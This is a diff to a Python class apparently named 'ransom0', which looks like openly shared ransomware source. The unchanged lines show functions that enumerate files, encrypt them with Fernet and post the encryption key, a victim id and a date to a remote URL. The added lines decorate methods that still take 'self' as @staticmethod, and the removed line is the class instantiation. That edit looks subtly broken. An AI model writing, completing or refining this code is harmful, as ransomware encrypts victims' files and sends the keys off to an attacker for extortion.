@@ -68,6 +68,7 @@ class ransom0:
         else: 
             _ = system('clear') 
 
+    @staticmethod
     def FindFiles(self):
         f = open("logs/path.txt", "w")
         cnt = 0
@@ -87,6 +88,7 @@ class ransom0:
         f.write(str(cnt))
         f.close()
 
+    @staticmethod
     def Encrypt(self, filename):
         f = Fernet(key)
         with open(filename, "rb") as file:
@@ -103,10 +105,6 @@ def SendData(decrypted):
     data = f'[{digits}, {key}, "{date}", "{decrypted}"]'
 
     requests.post(url, data)
-
-ransom0 = ransom0()
-
-
 
 def StartRansom():
 
